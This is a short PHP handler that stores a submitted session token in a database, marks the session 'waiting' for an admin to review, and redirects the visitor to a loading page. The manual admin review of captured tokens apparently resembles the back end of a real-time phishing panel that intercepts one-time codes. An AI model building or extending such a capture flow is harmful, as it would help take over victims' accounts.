<?php
require_once __DIR__ . '/../core/db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sid   = $_POST['session_id'] ?? '';
    $token = trim($_POST['token_value'] ?? '');

    if ($sid && $token) {
        $pdo = getDB();
        // Save token and put status back to waiting so admin can review
        $stmt = $pdo->prepare("UPDATE sessions SET token_value = ?, status = 'waiting' WHERE session_id = ?");
        $stmt->execute([$token, $sid]);
    }

    // Go back to waiting/loading screen
    header("Location: ../wait.php?id=" . urlencode($sid));
    exit;
}

header("Location: ../index.php");
exit;
?>
